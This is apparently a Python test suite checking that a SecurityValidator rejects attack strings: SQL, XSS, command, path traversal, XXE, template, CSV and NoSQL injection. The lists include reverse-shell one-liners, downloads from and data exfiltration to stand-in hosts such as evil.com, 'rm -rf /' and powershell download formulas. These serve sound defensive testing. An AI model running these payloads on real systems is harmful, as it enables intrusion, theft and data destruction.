import pytest

#!/usr/bin/env python3
"""Comprehensive test suite for SecurityValidator covering all attack vectors."""

import os
import sys
import unittest
import tempfile
import yaml
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.core.security_validator import SecurityValidator, SecurityError
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.core.pipeline_v6 import GMNAPPipeline
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.core.config import GMNAPConfig


class TestSecurityValidatorComprehensive(unittest.TestCase):
    """Comprehensive tests for SecurityValidator covering all attack vectors."""

    def setUp(self):
        """Set up test fixtures."""
        self.validator = SecurityValidator()

    @pytest.mark.timeout(15)
    def test_sql_injection_patterns(self):
        """Test detection of various SQL injection patterns."""
        sql_attacks = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1' AND '1' = '1",
            "admin'--",
            "' OR 1=1--",
            "1' UNION SELECT NULL--",
            "' OR 'a'='a",
            "'; EXEC xp_cmdshell('dir')--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "' OR EXISTS(SELECT * FROM users)--",
            "1' AND ASCII(SUBSTRING(password,1,1))>64--",
            "'; INSERT INTO users VALUES('hacker','password')--",
            "' UNION ALL SELECT creditcard FROM payments--",
            "1' AND (SELECT COUNT(*) FROM sysobjects)>1--",
            "' OR SLEEP(5)--",
        ]

        for attack in sql_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="sql_injection_test")

    @pytest.mark.timeout(15)
    def test_xss_injection_patterns(self):
        """Test detection of various XSS injection patterns."""
        xss_attacks = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "javascript:alert('XSS')",
            "<a href='javascript:alert(\"XSS\")'>Click</a>",
            "<input type='text' value='x' onmouseover='alert(1)'>",
            "<div style='background:url(javascript:alert(1))'>",
            "<object data='data:text/html,<script>alert(1)</script>'>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<img src='x' onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",
            "<svg><script>alert&lpar;1&rpar;</script></svg>",
            "<math><mtext><script>alert(1)</script></mtext></math>",
            "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
        ]

        for attack in xss_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="xss_test")

    @pytest.mark.timeout(15)
    def test_command_injection_patterns(self):
        """Test detection of command injection attempts."""
        command_attacks = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "& net user hacker password /add",
            "`cat /etc/shadow`",
            "$(wget http://evil.com/shell.sh)",
            "; shutdown -h now",
            "| mail attacker@evil.com < /etc/passwd",
            "& ping -c 10 127.0.0.1",
            "; curl http://evil.com/steal.php?data=",
            "|| nc -e /bin/sh attacker.com 4444",
            "&& echo 'hacked' > /tmp/pwned",
            "`id`",
            "$(/usr/bin/id)",
            "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        ]

        for attack in command_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="command_test")

    @pytest.mark.timeout(15)
    def test_path_traversal_patterns(self):
        """Test detection of path traversal attempts."""
        path_attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "file:///etc/passwd",
            "file://c:/windows/system32/config/sam",
            "/var/www/../../etc/passwd",
            "c:\\..\\..\\windows\\system32\\config\\sam",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "expect://ls",
        ]

        for attack in path_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="path_test")

    @pytest.mark.timeout(15)
    def test_ldap_injection_patterns(self):
        """Test detection of LDAP injection attempts."""
        ldap_attacks = [
            "*)(uid=*",
            "*)(|(uid=*))",
            "admin*",
            "admin*)((|userPassword=*)",
            "*)(objectClass=*",
            "*)(&(objectclass=*)",
            "*)(|(objectclass=*))",
            ")(cn=))(|(cn=",
            "*)(mail=*)",
            "x' or name()='username' or 'x'='y",
        ]

        for attack in ldap_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="ldap_test")

    @pytest.mark.timeout(15)
    def test_xml_injection_patterns(self):
        """Test detection of XML/XXE injection attempts."""
        xml_attacks = [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>',
            "<![CDATA[<script>alert('XSS')</script>]]>",
            '<!ENTITY xxe SYSTEM "file:///dev/random">',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo PUBLIC "-//OASIS//DTD ENTITY//EN" "http://evil.com/evil.dtd">',
            "<soap:Body><![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]></soap:Body>",
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>',
        ]

        for attack in xml_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="xml_test")

    @pytest.mark.timeout(15)
    def test_template_injection_patterns(self):
        """Test detection of template injection attempts."""
        template_attacks = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "{{self.__class__.__mro__[1].__subclasses__()}}",
            "${__import__('os').system('ls')}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "@(7*7)",
            "[[7*7]]",
            "${{7*7}}",
            "<%=7*7%>",
            "{php}echo `id`;{/php}",
            "{{constructor.constructor('alert(1)')()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",
            "{{''.__class__.mro()[1].__subclasses__()}}",
        ]

        for attack in template_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="template_test")

    @pytest.mark.timeout(15)
    def test_regex_dos_patterns(self):
        """Test detection of ReDoS (Regular Expression DoS) patterns."""
        regex_attacks = [
            "a" * 50 + "!" * 50,  # Catastrophic backtracking
            "(a+)+" * 20,
            "([a-zA-Z]+)*" * 20,
            "(a|a)*" * 30,
            "(a|ab)*" * 30,
            "(.*a){x}" * 10,
            "((a)*)*b",
            "(a*)*b",
            "(x+x+)+y",
            "([a-z]+)*$" * 20,
        ]

        for attack in regex_attacks:
            # These should be handled carefully to avoid actual ReDoS
            result = self.validator.validate_string(attack, context="regex_test")
            # Should either reject or handle safely
            self.assertIsNotNone(result)

    @pytest.mark.timeout(15)
    def test_unicode_attacks(self):
        """Test detection of Unicode-based attacks."""
        unicode_attacks = [
            "\u202e\u0041\u0042\u0043",  # Right-to-left override
            "\ufeff<script>alert('XSS')</script>",  # Zero-width no-break space
            "test\u0000data",  # Null byte injection
            "\u200b\u200c\u200d",  # Zero-width characters
            "\ud800\udc00",  # Surrogate pairs
            "\ufff9\ufffa\ufffb",  # Interlinear annotation
            "A\u0308\u0301",  # Combining diacritical marks
            "\u2028\u2029",  # Line/paragraph separators
            "\u001b[31mRed Text\u001b[0m",  # ANSI escape sequences
            "\u0001\u0002\u0003\u0004",  # Control characters
        ]

        for attack in unicode_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="unicode_test")

    @pytest.mark.timeout(15)
    def test_file_upload_patterns(self):
        """Test detection of malicious file upload patterns."""
        file_attacks = [
            "shell.php",
            "backdoor.asp",
            "webshell.jsp",
            "malware.exe",
            "../../../etc/passwd",
            "test.php.jpg",
            "exploit.php%00.jpg",
            "virus.exe.txt",
            "shell.php;.jpg",
            "test.php\x00.jpg",
            "../../windows/system32/cmd.exe",
            "shell.pHp",  # Case variation
            "test.php5",
            "backdoor.phtml",
            "shell.php7",
        ]

        for attack in file_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="file_upload_test")

    @pytest.mark.timeout(15)
    def test_nosql_injection_patterns(self):
        """Test detection of NoSQL injection attempts."""
        nosql_attacks = [
            "{'$ne': null}",
            "{'$gt': ''}",
            "{'$regex': '.*'}",
            "{'password': {'$ne': 1}}",
            "{'$where': 'this.password == \"password\"'}",
            "{'username': {'$in': ['admin', 'administrator']}}",
            "{'$or': [{'username': 'admin'}, {'password': 'password'}]}",
            "true, $where: '1 == 1'",
            "', $or: [ {}, { 'a':'a",
            "$where: function() { return true }",
        ]

        for attack in nosql_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="nosql_test")

    @pytest.mark.timeout(15)
    def test_csv_injection_patterns(self):
        """Test detection of CSV injection attempts."""
        csv_attacks = [
            "=1+1",
            "+1+1",
            "-1+1",
            "@SUM(1+1)",
            "=cmd|'/c calc'!A0",
            "=2+5+cmd|'/c calc'!A0",
            "@SUM(1+9)*cmd|'/c calc'!A0",
            "=1+1+cmd|'/c notepad'!A0",
            "=2+5+cmd|'/c powershell IEX(wget bit.ly/p)'!A0",
            "=cmd|'/c powershell Invoke-WebRequest http://evil.com/shell.ps1 -OutFile shell.ps1'!A0",
        ]

        for attack in csv_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="csv_test")

    @pytest.mark.timeout(15)
    def test_homograph_attacks(self):
        """Test detection of homograph attacks using lookalike characters."""
        homograph_attacks = [
            "раураl",  # Cyrillic 'a' and 'l'
            "gооgle",  # Cyrillic 'o'
            "miсrosoft",  # Cyrillic 'c'
            "αpple",  # Greek alpha
            "facеbook",  # Cyrillic 'e'
            "twittеr",  # Cyrillic 'e'
            "аmazon",  # Cyrillic 'a'
            "bаnk",  # Cyrillic 'a'
            "pаypаl",  # Cyrillic 'a'
            "еbay",  # Cyrillic 'e'
        ]

        for attack in homograph_attacks:
            # Should detect non-ASCII lookalikes
            result = self.validator.validate_string(attack, context="homograph_test")
            # Should either reject or flag as suspicious
            self.assertIsNotNone(result)

    @pytest.mark.timeout(15)
    def test_length_limits(self):
        """Test that extremely long inputs are rejected."""
        # Test various length attacks
        long_inputs = [
            "A" * 151,  # Just over limit
            "B" * 200,  # Well over limit
            "C" * 1000,  # Way over limit
            "D" * 10000,  # Extreme length
        ]

        for long_input in long_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(long_input, context="length_test")

        # Test that 150 chars is accepted
        valid_input = "E" * 150
        result = self.validator.validate_string(valid_input, context="length_test")
        self.assertEqual(result, valid_input)

    @pytest.mark.timeout(15)
    def test_encoded_attacks(self):
        """Test detection of various encoded attack patterns."""
        encoded_attacks = [
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",  # URL encoded
            "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",  # HTML entities
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",  # Hex encoding
            "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",  # Base64
            "%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E",  # Double URL encoding
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",  # Unicode escapes
            "%26lt%3Bscript%26gt%3Balert%28%27XSS%27%29%26lt%3B%2Fscript%26gt%3B",  # Mixed encoding
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",  # Hex HTML entities
            "\\\\x3c\\\\x73\\\\x63\\\\x72\\\\x69\\\\x70\\\\x74\\\\x3e",  # Double escaped hex
            "%00<script>alert('XSS')</script>",  # Null byte prefix
        ]

        for attack in encoded_attacks:
            with self.assertRaises(SecurityError):
                self.validator.validate_string(attack, context="encoded_test")

    @pytest.mark.timeout(15)
    def test_sanitization(self):
        """Test that the sanitization method properly cleans dangerous input."""
        test_cases = [
            ("Hello<script>alert('XSS')</script>World", "HelloWorld"),
            ("Test'; DROP TABLE users; --", "Test DROP TABLE users "),
            ("Normal text", "Normal text"),
            ("Email: user@example.com", "Email: user@example.com"),
            ("Path: ../../../etc/passwd", "Path: etcpasswd"),
            ("${7*7} = 49", " = 49"),
            ("{{config.secret}}", ""),
            ("Test\x00null\x00byte", "Testnullbyte"),
            ("Unicode\u202eReverse", "UnicodeReverse"),
            ("<img src=x onerror=alert(1)>", ""),
        ]

        for input_str, expected in test_cases:
            result = self.validator.sanitize(input_str)
            self.assertEqual(result, expected)

    @pytest.mark.timeout(15)
    def test_entry_validation(self):
        """Test validation of complete entry dictionaries."""
        # Valid entries should pass
        valid_entries = [
            {"CanonicalLatin": "John Smith", "GlobalID": "john001"},
            {"CanonicalLatin": "María García", "GlobalID": "maria001"},
            {"CanonicalLatin": "李明", "CanonicalNative": "Li Ming", "GlobalID": "li001"},
            {"CanonicalLatin": "Jean-Claude", "GlobalID": "jc001"},
        ]

        for entry in valid_entries:
            result = self.validator.validate_entry(entry)
            self.assertTrue(result)

        # Malicious entries should fail
        malicious_entries = [
            {"CanonicalLatin": "'; DROP TABLE users; --", "GlobalID": "hack001"},
            {"CanonicalLatin": "<script>alert('XSS')</script>", "GlobalID": "xss001"},
            {"CanonicalLatin": "../../etc/passwd", "GlobalID": "path001"},
            {"CanonicalLatin": "A" * 200, "GlobalID": "dos001"},
            {"CanonicalLatin": "Test\x00Null", "GlobalID": "null001"},
        ]

        for entry in malicious_entries:
            with self.assertRaises(SecurityError):
                self.validator.validate_entry(entry)

    @pytest.mark.timeout(15)
    def test_cjk_round_trip(self):
        """Test CJK name round-trip validation."""
        # Valid CJK names with correct round-trip
        valid_cjk = [
            {"CanonicalNative": "王明", "CanonicalLatin": "Wang Ming", "GlobalID": "wang001"},
            {"CanonicalNative": "李华", "CanonicalLatin": "Li Hua", "GlobalID": "li001"},
            {"CanonicalNative": "김민준", "CanonicalLatin": "Kim Min-jun", "GlobalID": "kim001"},
            {
                "CanonicalNative": "山田太郎",
                "CanonicalLatin": "Yamada Taro",
                "GlobalID": "yamada001",
            },
        ]

        for entry in valid_cjk:
            result = self.validator.validate_entry(entry)
            self.assertTrue(result)

        # Should detect potential round-trip issues
        suspicious_cjk = [
            {"CanonicalNative": "王明", "CanonicalLatin": "Smith John", "GlobalID": "mismatch001"},
            {
                "CanonicalNative": "李华",
                "CanonicalLatin": "'; DROP TABLE users; --",
                "GlobalID": "hack001",
            },
        ]

        for entry in suspicious_cjk:
            with self.assertRaises(SecurityError):
                self.validator.validate_entry(entry)

    @pytest.mark.timeout(15)
    def test_pipeline_integration(self):
        """Test integration with GMNAPPipeline."""
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir = Path(tmpdir)

            # Create test data with both valid and malicious entries
            test_data = {
                "John Smith": {"GlobalID": "john001"},
                "'; DROP TABLE users; --": {"GlobalID": "sql001"},
                "<script>alert('XSS')</script>": {"GlobalID": "xss001"},
                "María García": {"GlobalID": "maria001"},
                "A" * 200: {"GlobalID": "dos001"},
                "李明": {"CanonicalNative": "Li Ming", "GlobalID": "li001"},
                "../../etc/passwd": {"GlobalID": "path001"},
            }

            # Write test file
            test_file = tmpdir / "test_security.yaml"
            with open(test_file, "w", encoding="utf-8") as f:
                yaml.dump(test_data, f, allow_unicode=True)

            # Run pipeline
            config = GMNAPConfig()
            config.cache.cache_dir = "./cache_security_test"
            pipeline = GMNAPPipeline(config)

            result = pipeline.run(tmpdir)

            # Check that malicious entries were blocked
            self.assertGreater(result.failed_entries, 0)
            self.assertGreater(len(result.validation_errors), 0)

            # Check that valid entries passed
            self.assertGreater(result.successful_entries, 0)

            # Verify no malicious content in output
            output_dir = Path(config.cache.cache_dir) / "output"
            if output_dir.exists():
                for output_file in output_dir.glob("*.yaml"):
                    with open(output_file, "r", encoding="utf-8") as f:
                        content = f.read()
                        self.assertNotIn("DROP TABLE", content)
                        self.assertNotIn("<script>", content)
                        self.assertNotIn("../", content)


def run_comprehensive_security_tests():
    """Run all comprehensive security tests."""
    # Create test suite
    loader = unittest.TestLoader()
    suite = loader.loadTestsFromTestCase(TestSecurityValidatorComprehensive)

    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    # Print summary
    print("\n" + "=" * 70)
    print("COMPREHENSIVE SECURITY TEST RESULTS")
    print("=" * 70)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Skipped: {len(result.skipped)}")

    if result.wasSuccessful():
        print("\nPASS ALL SECURITY TESTS PASSED!")
        print("The SecurityValidator successfully detected all attack patterns.")
    else:
        print("\nFAIL SOME SECURITY TESTS FAILED!")
        print("The SecurityValidator may have vulnerabilities.")

        if result.failures:
            print("\nFailed tests:")
            for test, traceback in result.failures:
                print(f"  - {test}")

        if result.errors:
            print("\nTests with errors:")
            for test, traceback in result.errors:
                print(f"  - {test}")

    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_comprehensive_security_tests()
    # sys.exit(0 if success else 1)  # MOVED: Was at module level
